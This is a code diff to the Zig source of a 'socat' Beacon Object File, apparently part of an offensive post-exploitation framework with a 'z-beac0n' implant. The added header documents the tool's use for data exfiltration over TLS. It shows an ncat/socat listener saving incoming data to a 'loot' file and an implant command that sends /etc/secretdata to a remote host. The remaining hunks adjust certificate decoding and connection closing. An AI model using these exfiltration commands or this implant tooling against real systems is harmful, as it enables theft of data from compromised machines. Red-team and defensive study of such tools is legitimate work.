@@ -1,3 +1,33 @@
+///name: socat
+///description: "Concatenate and redirect sockets"
+///author: Z-Labs
+///tags: ['windows', 'linux','TA0007', 'T1083', 'z-labs']
+///category: "POSTEX-BOF"
+///OS: cross-platform
+///sources:
+///    - 'https://raw.githubusercontent.com/The-Z-Labs/bof-launcher/main/bofs/src/socat.zig'
+///examples: |
+/// Usage:
+///   socat <src-address> <sink-address>
+///
+/// <src-address> - an address that acts as data source
+/// <sink-address> - an address that acts as data sink
+///
+/// Currently available address types:
+///   OPEN:<filename> - currently available as <src-address> only
+///   CREATE:<filename> - currently available as <src-address> only
+///   TCP:<host:port> - currently available as <sink-address> only
+///   TLS:<host:port> - currently available as <sink-address> only
+///
+/// Example use case: data exfiltration via TLS channel with z-beac0n:
+///
+/// Setting up listener with ncat on the server-side:
+///   ncat --ssl -nlvp 8443 --ssl-cert cert.pem --ssl-key key.pem > loot
+/// OR with socat (original):
+///   socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:loot
+///
+/// In the implant:
+///   z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443
 const std = @import("std");
 const posix = @import("std").posix;
 const bofapi = @import("bof_api");
@@ -80,7 +110,7 @@ fn addCertsFromMemory(cb: *std.crypto.Certificate.Bundle, alloc: std.mem.Allocat
     const begin_marker = "-----BEGIN CERTIFICATE-----";
     const end_marker = "-----END CERTIFICATE-----";
 
-    const b64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
+    const base64 = std.base64.standard.decoderWithIgnore(" \t\r\n");
 
     const now_sec = std.time.timestamp();
 
@@ -93,9 +123,7 @@ fn addCertsFromMemory(cb: *std.crypto.Certificate.Bundle, alloc: std.mem.Allocat
         const encoded_cert = std.mem.trim(u8, encoded_bytes[cert_start..cert_end], " \t\r\n");
         const decoded_start: u32 = @intCast(cb.bytes.items.len);
         const dest_buf = cb.bytes.allocatedSlice()[decoded_start..];
-        //cb.bytes.items.len += try std.crypto.Certificate.Bundle.base64.decode(dest_buf, encoded_cert);
-        _ = try b64_decoder.decode(dest_buf, encoded_cert);
-        cb.bytes.items.len += try b64_decoder.calcSizeForSlice(encoded_cert);
+        cb.bytes.items.len += try base64.decode(dest_buf, encoded_cert);
         try cb.parseCert(alloc, decoded_start, now_sec);
     }
 }
@@ -211,6 +239,7 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
                 }
 
                 std.Thread.sleep(1000000000);
+                conn.close() catch return 11;
                 tcp.close();
                 return 0;
             }
